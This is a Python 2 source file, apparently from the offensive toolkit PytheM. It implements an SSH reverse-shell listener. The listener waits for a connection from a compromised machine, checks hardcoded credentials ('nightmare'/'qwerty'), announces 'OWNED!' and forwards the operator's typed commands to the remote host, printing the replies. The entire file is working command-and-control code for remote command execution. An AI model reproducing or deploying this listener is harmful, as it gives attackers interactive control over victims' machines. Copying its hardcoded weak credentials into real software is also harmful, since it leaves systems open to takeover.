#!/usr/bin/env python2.7
#coding=UTF-8

# Copyright (c) 2016 m4n3dw0lf
#
# This file is part of the program PytheM
#
# PytheM is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA


import paramiko
import getopt
import threading
import sys
import socket


class Server(paramiko.ServerInterface):
	def __init__(self, server, port):
		self.event = threading.Event()
		self.HOST_KEY = paramiko.RSAKey(filename='config/test_rsa.key')
		self.USERNAME = 'nightmare'
		self.PASSWORD = 'qwerty'
		self.server = server
		self.port = int(port)
	def check_channel_request(self, kind, chanid):
		if kind == 'session':
			return paramiko.OPEN_SUCCEEDED
		return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PHOHIBITED
	def check_auth_password(self, username, password):
		if (username == self.USERNAME) and (password == self.PASSWORD):
			return paramiko.AUTH_SUCCESSFUL
		return paramiko.AUTH_FAILED

	def start(self):
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			sock.bind((self.server, self.port))
			sock.listen(100)
			print "[+] Waiting for connections ..."
			client, addr = sock.accept()
		except Exception, e:
			print "[-] Connection failed: "+str(e)
			sys.exit(1)
		print "[+] Connection established!"

		try:
			Session = paramiko.Transport(client)
			Session.add_server_key(self.HOST_KEY)
			paramiko.util.log_to_file("log/shell.log")
			server = Server(self.server,self.port)
			try:
				Session.start_server(server=server)
			except paramiko.SSHException, x:
				print '[-] SSH negotiation failed.'
			chan = Session.accept(10)
			print '[+] Authenticated!'
			chan.send("OWNED!")
			while 1:
				try:
					command = raw_input("command> ").strip('\n')
					if command != 'exit':
						chan.send(command)
						print chan.recv(1024) + '\n'
					else:
						chan.send('exit')
						print '[*] Exiting ...'
						Session.close()
						raise Exception('exit')
				except KeyboardInterrupt:
					Session.close()
		except Exception, e:
			print "[-] Ouch!: " + str(e)
			try:
				Session.close()
			except:
				pass
			sys.exit(1)
	def stop(self):
		sys.exit(1)
